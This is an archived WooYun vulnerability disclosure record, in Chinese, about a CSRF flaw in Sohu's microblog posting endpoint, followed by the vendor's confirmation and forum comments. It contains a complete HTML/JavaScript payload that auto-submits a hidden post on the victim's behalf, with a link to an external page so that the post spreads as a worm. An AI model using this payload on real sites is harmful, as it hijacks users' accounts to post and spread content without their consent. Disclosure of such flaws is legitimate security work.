{"id": 8959, "wybug_id": "wooyun-2013-035624", "wybug_title": "搜狐CSRF实例一:让蠕虫来得更猛烈些", "wybug_corp": "搜狐", "wybug_author": "LaiX", "wybug_date": "2013-08-29 18:50", "wybug_open_date": "2013-10-13 18:50", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "蠕虫", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-13：\t细节向公众公开  简要描述： 我们这次来看看如何利用纯CSRF来实现蠕虫攻击。 详细说明：  问题URL: http://i.sohu.com/a/app/mblog/save.htm?_input_encode=UTF-8 可CSRF发微博。下面来看看怎么利用   漏洞证明：  通过上面的URL我构造了一个payload ，打开后先POST一条微博，然后等5秒跳转到指定地址。\n<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"><h1>正在跳转...</h1><iframe id=\"test_iframe\" src=\"http://www.tianya.cn/82776194\" style='display:none'></iframe><script>function CSRF(){      test_iframe.document.write(\"<form id='test_form' action='http://i.sohu.com/a/app/mblog/save.htm?_input_encode=UTF-8' method='post' >\"                     +\"<input type='hidden'  name='content' value='荐一个好东西 http://cnhk.ml/souhu/send.html'>\"                     +\"<input type='hidden'  name='type' value='0'>\"                     +\"<input type='hidden'  name='from' value='sentence'>\"                      +\"<input type='hidden'  name='url' value=''>\"                     +\"</form>\"                     +\"<script>document.getElementById('test_form').submit();<\\/script>\"\t                );}CSRF();window.setTimeout(\"window.location.href='http://threejs.org/'\", 5000); //延迟5秒后跳转到指定网页</script>\nPOST的内容为\n荐一个好东西 http://cnhk.ml/souhu/send.html\n\n\n这样就构成了一个CSRF蠕虫   修复方案：  明天考试祝我好运...   版权声明：转载请注明来源 LaiX@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-08-29 19:09 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-29 21:00 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  @xsser 能帮我把标题改一下吗，我把二打成了一    \n     2013-08-30 21:06 |    \t\t寸芒 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | 小菜鸟，无意逆天……)\t\t \n  @LaiX 你太激动了 连载的节奏    \n     2013-10-13 19:20 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  又建连载牛,,    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}